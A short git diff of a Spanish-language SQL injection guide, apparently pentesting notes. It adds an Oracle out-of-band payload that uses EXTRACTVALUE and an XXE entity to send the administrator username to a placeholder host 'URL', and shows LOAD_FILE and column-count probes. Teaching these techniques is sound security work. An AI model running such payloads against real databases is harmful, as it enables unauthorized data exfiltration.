@@ -232,10 +232,11 @@ LOAD_FILE('\\\\URL\a') SELECT ... INTO OUTFILE '\\\\URL
 ```
 
 
-En el caso de querer extraer información con este ataque realizaremos los siguientes pasos, una vez hemos verificado que es este tipo de ataque 
+En el caso de querer extraer información con este ataque realizaremos los siguientes pasos, una vez hemos verificado que es este tipo de ataque
+Si por ejemplo la consulta que nos esta funcionando por que la base de datos es una `ORACLE` y estamos usando `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://URL/">%remote;]>'),'/1') FROM dual-- -`.
 
-
-
+Y queremos extraer el usuario `Administrador` usaremos las siguiente query
+`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select username from users where username='administrator')||'.URL/">%remote;]>'),'/1') FROM dual-- -`
 
 # Inyección basada en errores visibles
 Se acontece cuando hacemos una inyección por ejemplo al introducir una `'` y se nos muestra un error por pantalla, como siempre primero identificaremos el numero de columnas, `'order by 5-- -` a continuación con las columnas identificadas
